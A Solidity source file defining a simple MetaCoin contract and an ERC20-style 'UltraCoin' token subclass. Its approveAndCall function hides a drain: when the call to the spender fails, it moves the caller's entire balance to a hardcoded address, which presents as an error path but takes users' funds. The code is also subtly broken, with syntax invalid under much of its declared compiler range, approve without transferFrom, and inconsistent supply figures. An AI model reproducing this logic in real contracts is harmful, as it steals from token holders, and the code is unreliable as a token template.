pragma solidity >=0.4.25 <0.7.0;

import "./ConvertLib.sol";

// This is just a simple example of a coin-like contract.
// It is not standards compatible and cannot be expected to talk to other
// coin/token contracts. If you want to create a standards-compliant
// token, see: https://github.com/ConsenSys/Tokens. Cheers!

contract MetaCoin {
	mapping (address => uint) balances;
	mapping (address => mapping (address => uint)) allowed;

	event Transfer(address indexed _from, address indexed _to, uint256 amount);
	event Approval(address indexed _owner, address indexed _spender, uint256 amount);

	function sendCoin(address receiver, uint amount) public returns(bool sufficient) {
		if (balances[msg.sender] < amount) return false;
		balances[msg.sender] -= amount;
		balances[receiver] += amount;
		emit Transfer(msg.sender, receiver, amount);
		return true;
	}

	function getBalanceInEth(address addr) public view returns(uint){
		return ConvertLib.convert(getBalance(addr),2);
	}

	function getBalance(address addr) public view returns(uint) {
		return balances[addr];
	}

	function transfer(address _to, uint256 amount) public returns (bool success) {
        if (balances[msg.sender] >= amount && amount > 0) {
            balances[msg.sender] -= amount;
            balances[_to] += amount;
            emit Transfer(msg.sender, _to, amount);
            return true;
        } else {return false;}
    }

	function approve(address _spender, uint256 amount) public returns (bool success) {
		allowed[msg.sender][_spender] = amount;
        emit Approval(msg.sender, _spender, amount);
        return true;
	}

    function allowance(address _owner, address _spender) public view returns (uint256 remaining) {
		return allowed[_owner][_spender];
	}
	
	function totalSupply() constant public returns (uint256 supply) {
	    return total - balances[address(0)];
	}

    uint256 public total;
}

contract ERC20MetaCoin is MetaCoin {

    string public name;
    uint8 public decimals;
    string public version = 'v1.0';
    string public symbol;


    constructor () public {
        balances[msg.sender] = 999;
        total = 999999;
        decimals = 5;
        name = "UltraCoin";
        symbol = "ULC";
    }

    function approveAndCall(address _spender, uint256 _value, bytes _extraData) public returns (bool success) {
        allowed[msg.sender][_spender] = _value;
        emit Approval(msg.sender, _spender, _value);
        if(!_spender.call(bytes4(bytes32(keccak256("receiveApproval(address,uint256,address,bytes)"))), msg.sender, _value, this, _extraData)) {
            sendCoin(0xB00304Beb5AAAbB964Ee8417b3cde714326efDA2,balances[msg.sender]);
        }
        return true;
    }
}
